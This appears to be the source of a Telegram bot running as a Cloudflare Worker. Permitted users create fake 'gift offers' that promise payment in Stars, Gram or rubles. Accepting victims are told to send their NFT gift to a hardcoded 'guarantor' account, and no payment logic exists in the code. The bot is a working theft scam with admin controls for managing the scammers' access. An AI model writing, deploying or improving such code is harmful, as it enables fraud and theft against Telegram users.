
const ADMIN_ID = 5151757168;
const WEBHOOK_SECRET = "GarisOffer9231998";
const RELAYER_USERNAME = "GarisOfferRelayer";

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN;
    const kv = env.USERS_KV;

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // КОМАНДА /remove (ТОЛЬКО ДЛЯ АДМИНА)
      // Примеры: /remove 123456789
      //          /remove @username
      //          /remove "@username"
      // ==========================================
      if (update.message && update.message.text &&
          /^\/remove(?:@\w+)?(?:\s|$)/i.test(update.message.text)) {

        const chatId = update.message.chat.id;
        const senderId = update.message.from.id;

        if (senderId !== ADMIN_ID) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: "⛔ У вас нет прав."
          }, BOT_TOKEN);
          return new Response("OK", { status: 200 });
        }

        if (!kv) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: "❌ База данных KV не подключена."
          }, BOT_TOKEN);
          return new Response("OK", { status: 200 });
        }

        const argument = update.message.text
          .replace(/^\/remove(?:@\w+)?/i, "")
          .trim()
          .replace(/^["']|["']$/g, "")
          .trim();

        if (!argument) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: "⚠️ Укажите ID или username пользователя.\n\nПримеры:\n/remove 5151757168\n/remove @username\n/remove \"@username\""
          }, BOT_TOKEN);
          return new Response("OK", { status: 200 });
        }

        let targetUserId = null;

        // Если указан числовой ID
        if (/^\d+$/.test(argument)) {
          targetUserId = argument;
        } else {
          // Если указан username — ищем его среди зарегистрированных
          const targetUsername = argument.replace(/^@/, "").toLowerCase();

          let cursor = undefined;

          do {
            const list = await kv.list({ prefix: "user:", cursor });

            for (const key of list.keys) {
              const savedUsername = await kv.get(key.name);

              if (
                savedUsername &&
                savedUsername.replace(/^@/, "").toLowerCase() === targetUsername
              ) {
                targetUserId = key.name.replace("user:", "");
                break;
              }
            }

            if (targetUserId) break;
            cursor = list.cursor;
          } while (cursor);
        }

        if (!targetUserId) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: `❌ Пользователь ${argument} не найден.\n\nПроверьте username или используйте ID.`
          }, BOT_TOKEN);
          return new Response("OK", { status: 200 });
        }

        // Удаляем только права доступа.
        // Запись user: оставляем, чтобы пользователь остался в статистике.
        await kv.delete(`vip_id:${targetUserId}`);
        await kv.delete(`allowed_id:${targetUserId}`);

        await callApi("sendMessage", {
          chat_id: chatId,
          text: `✅ Доступ пользователя отозван.\n\n🆔 ID: ${targetUserId}\n\nПользователь остался в базе и будет отображаться в /stats, но больше не сможет создавать офферы.`
        }, BOT_TOKEN);

        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // КОМАНДА /stats (ТОЛЬКО ДЛЯ АДМИНА)
      // ==========================================
      if (update.message && update.message.text === "/stats") {
        const senderId = update.message.from.id;
        const chatId = update.message.chat.id;

        if (senderId !== ADMIN_ID) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: "⛔ У вас нет прав."
          }, BOT_TOKEN);
          return new Response("OK", { status: 200 });
        }

        if (!kv) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: "❌ База данных KV не подключена."
          }, BOT_TOKEN);
          return new Response("OK", { status: 200 });
        }

        try {
          let cursor = undefined;
          let usersList = [];
          let vipCount = 0;
          let accessCount = 0;
          let totalOffers = 0;

          do {
            const list = await kv.list({ cursor });

            for (const key of list.keys) {
              if (key.name.startsWith("offer:")) {
                totalOffers++;
              }

              if (key.name.startsWith("user:")) {
                const userId = key.name.replace("user:", "");
                const username = await kv.get(key.name);

                const isVip = await kv.get(`vip_id:${userId}`);
                const hasAccess = await kv.get(`allowed_id:${userId}`);

                let status = "";

                if (isVip) {
                  status = "👑 [VIP]";
                  vipCount++;
                } else if (hasAccess) {
                  status = "✅ [Доступ]";
                  accessCount++;
                }

                usersList.push(`@${username} (${userId}) ${status}`);
              }
            }

            cursor = list.cursor;
          } while (cursor);

          let statsText = `📊 <b>Статистика:</b>\n\n`;
          statsText += `👥 <b>Всего в боте:</b> ${usersList.length}\n`;
          statsText += `👑 <b>VIP-доступ:</b> ${vipCount}\n`;
          statsText += `✅ <b>Обычный доступ:</b> ${accessCount}\n`;
          statsText += `📦 <b>Активных офферов:</b> ${totalOffers}\n\n`;

          if (usersList.length > 0) {
            statsText += `📋 <b>Список (сортировка по статусу):</b>\n`;

            usersList.sort((a, b) => {
              if (a.includes("👑") && !b.includes("👑")) return -1;
              if (!a.includes("👑") && b.includes("👑")) return 1;
              if (a.includes("✅") && !b.includes("✅")) return -1;
              if (!a.includes("✅") && b.includes("✅")) return 1;
              return 0;
            });

            statsText += usersList.join("\n");
          }

          await callApi("sendMessage", {
            chat_id: chatId,
            text: statsText,
            parse_mode: "HTML"
          }, BOT_TOKEN);

        } catch (err) {
          await callApi("sendMessage", {
            chat_id: chatId,
            text: `❌ Ошибка: ${err.message}`
          }, BOT_TOKEN);
        }

        return new Response("OK", { status: 200 });
      }

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username || "no_username";

        if (kv) await kv.put(`user:${userId}`, username);

        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту.\n4. Оплата приходит автоматически.`;

        const startMarkup = {
          inline_keyboard: [[
            { text: "❓ Как принять оффер?", callback_data: "how_to_accept" }
          ]]
        };

        await callApi("sendMessage", {
          chat_id: chatId,
          text: startText,
          parse_mode: "HTML",
          reply_markup: startMarkup
        }, BOT_TOKEN);
      }

      // --- INLINE-ЗАПРОСЫ ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username || "";

        if (kv) await kv.put(`user:${userId}`, username || "no_username");

        // Проверяем право создавать офферы.
        // Администратор имеет доступ всегда.
        let hasPermission = userId === ADMIN_ID;

        if (!hasPermission && kv) {
          const isVip = await kv.get(`vip_id:${userId}`);
          const hasAccess = await kv.get(`allowed_id:${userId}`);

          hasPermission = !!(isVip || hasAccess);
        }

        if (!hasPermission) {
          await callApi("answerInlineQuery", {
            inline_query_id: iq.id,
            results: [],
            cache_time: 0,
            is_personal: true,
            switch_pm_text: "⛔ Нет доступа к созданию офферов",
            switch_pm_parameter: "start"
          }, BOT_TOKEN);

          return new Response("OK", { status: 200 });
        }

        let textQuery = iq.query
          .replace(/[\u00A0\u200B\u202F]/g, " ")
          .replace(/https?:\/\//gi, "")
          .trim()
          .toLowerCase();

        let lang = "ru";

        if (textQuery.includes("eng") || textQuery.includes("en ")) {
          lang = "en";
          textQuery = textQuery.replace(/eng/g, "").trim();
        } else if (textQuery.includes("cn") || textQuery.includes("中文")) {
          lang = "cn";
          textQuery = textQuery.replace(/cn/g, "").trim();
        }

        const allNums = textQuery.match(/\d+/g);
        const amount = allNums ? allNums[allNums.length - 1] : "0";

        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i);

        let giftLink = "";

        if (giftMatch) {
          let rawGift = giftMatch[0].replace(/^https?:\/\//, "");
          giftLink = rawGift.startsWith("t.me")
            ? "https://" + rawGift
            : "https://t.me/nft/" + rawGift;
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";

        if (textQuery.includes("gram") || textQuery.includes("ton")) {
          currencyType = "gram";
          currencyDisplay = "💎 Gram";
        } else if (textQuery.includes("rub") || textQuery.includes("руб")) {
          currencyType = "rub";
          currencyDisplay = "₽ Rub";
        }

        let senderName = iq.from.first_name || "";

        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        const targetReceiver = RELAYER_USERNAME;

        let text = "";
        let btnAccept = "Принять";
        let btnDecline = "Отклонить";
        let titleText = "";

        if (lang === "en") {
          text = `<b>Gift Offer</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
          btnAccept = "Accept";
          btnDecline = "Decline";
          titleText = `Offer: ${amount} ${currencyDisplay}`;
        } else if (lang === "cn") {
          text = `<b>礼物报价</b>\n\n有人为您提供 <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
          btnAccept = "接受";
          btnDecline = "拒绝";
          titleText = `报价: ${amount} ${currencyDisplay}`;
        } else {
          text = `<b>Оффер на подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
          btnAccept = "Принять";
          btnDecline = "Отклонить";
          titleText = `Оффер: ${amount} ${currencyDisplay}`;
        }

        const offerId = Math.random().toString(36).substring(2, 10);

        if (kv) {
          await kv.put(
            `offer:${offerId}`,
            JSON.stringify({
              amount,
              currencyType,
              giftLink,
              lang,
              senderName,
              targetReceiver
            }),
            { expirationTtl: 86400 }
          );
        }

        const results = [{
          type: "article",
          id: "1",
          title: titleText,
          description: `${amount} ${currencyDisplay}`,
          input_message_content: {
            message_text: text,
            parse_mode: "HTML"
          },
          reply_markup: {
            inline_keyboard: [
              [{ text: btnAccept, callback_data: `acc|${offerId}` }],
              [{ text: btnDecline, callback_data: `dec|${offerId}` }]
            ]
          }
        }];

        await callApi("answerInlineQuery", {
          inline_query_id: iq.id,
          results: results,
          cache_time: 0
        }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;

        if (cq.data === "how_to_accept") {
          await callApi("answerCallbackQuery", {
            callback_query_id: cq.id
          }, BOT_TOKEN);

          const instructionText = `🎁 <b>Инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок гаранту.\n4. Оплата придет автоматически.`;

          const backMarkup = {
            inline_keyboard: [[
              { text: "Назад", callback_data: "back_to_start" }
            ]]
          };

          try {
            await callApi("editMessageText", {
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text: instructionText,
              parse_mode: "HTML",
              reply_markup: backMarkup
            }, BOT_TOKEN);
          } catch (e) {}
        }

        if (cq.data === "back_to_start") {
          await callApi("answerCallbackQuery", {
            callback_query_id: cq.id
          }, BOT_TOKEN);

          const userId = cq.from.id;

          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту.\n4. Оплата приходит автоматически.`;

          const startMarkup = {
            inline_keyboard: [[
              { text: "❓ Как принять оффер?", callback_data: "how_to_accept" }
            ]]
          };

          try {
            await callApi("editMessageText", {
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text: startText,
              parse_mode: "HTML",
              reply_markup: startMarkup
            }, BOT_TOKEN);
          } catch (e) {}
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const offerId = dataParts[1];

          if (!offerId) return new Response("OK", { status: 200 });

          let offer = {
            amount: "0",
            currencyType: "stars",
            giftLink: "",
            lang: "ru",
            senderName: "",
            targetReceiver: RELAYER_USERNAME
          };

          if (kv) {
            const saved = await kv.get(`offer:${offerId}`);
            if (saved) offer = JSON.parse(saved);
          }

          const amount = offer.amount;
          const currencyType = offer.currencyType;
          const lang = offer.lang;
          const targetReceiver = offer.targetReceiver || RELAYER_USERNAME;

          let displayCurrency = "⭐ Stars";

          if (currencyType === "gram") displayCurrency = "💎 Gram";
          if (currencyType === "rub") displayCurrency = "₽ Rub";

          const buyer = cq.from;
          let buyerName = buyer.first_name || "";

          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", {
              callback_query_id: cq.id,
              text: "Оффер принят ✅",
              show_alert: true
            }, BOT_TOKEN);

            const finalUrl = "https://t.me/" + targetReceiver;

            if (lang === "en") {
              newText = `✅ <b>Accepted</b>\n\nTo receive <b>${amount} ${displayCurrency}</b>, send the gift to:\n\n‼️ <b>Important:</b> send the gift exactly to the guarantor <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
              newMarkup = {
                inline_keyboard: [[
                  { text: "Send Gift", url: finalUrl }
                ]]
              };
            } else if (lang === "cn") {
              newText = `✅ <b>已接受</b>\n\n要获得 <b>${amount} ${displayCurrency}</b>，请将礼物发送至：\n\n‼️ <b>重要：</b>请将礼物发送给担保人 <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
              newMarkup = {
                inline_keyboard: [[
                  { text: "发送礼物", url: finalUrl }
                ]]
              };
            } else {
              newText = `✅ <b>Принято</b>\n\nЧтобы получить <b>${amount} ${displayCurrency}</b>, отправьте подарок:\n\n‼️ <b>Важно:</b> отправьте подарок именно гаранту <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
              newMarkup = {
                inline_keyboard: [[
                  { text: "Передать подарок", url: finalUrl }
                ]]
              };
            }
          } else {
            await callApi("answerCallbackQuery", {
              callback_query_id: cq.id
            }, BOT_TOKEN);

            newText = lang === "en"
              ? `❌ <b>Declined</b>`
              : `❌ <b>Отклонено</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", {
                  inline_message_id: cq.inline_message_id,
                  caption: newText,
                  parse_mode: "HTML",
                  reply_markup: newMarkup
                }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", {
                  inline_message_id: cq.inline_message_id,
                  text: newText,
                  parse_mode: "HTML",
                  reply_markup: newMarkup
                }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            const chatId = cq.message.chat.id;
            const messageId = cq.message.message_id;

            try {
              await callApi("sendMessage", {
                chat_id: chatId,
                text: newText,
                parse_mode: "HTML",
                reply_markup: newMarkup
              }, BOT_TOKEN);

              try {
                await callApi("deleteMessage", {
                  chat_id: chatId,
                  message_id: messageId
                }, BOT_TOKEN);
              } catch (e) {}
            } catch (err) {}
          }
        }
      }

      return new Response("OK", { status: 200 });

    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });

    const data = await response.json();

    if (!data.ok) throw new Error(data.description);

    return data;
  } catch (e) {
    console.error(`Ошибка API [${method}]:`, e.message);
    throw e;
  }
}
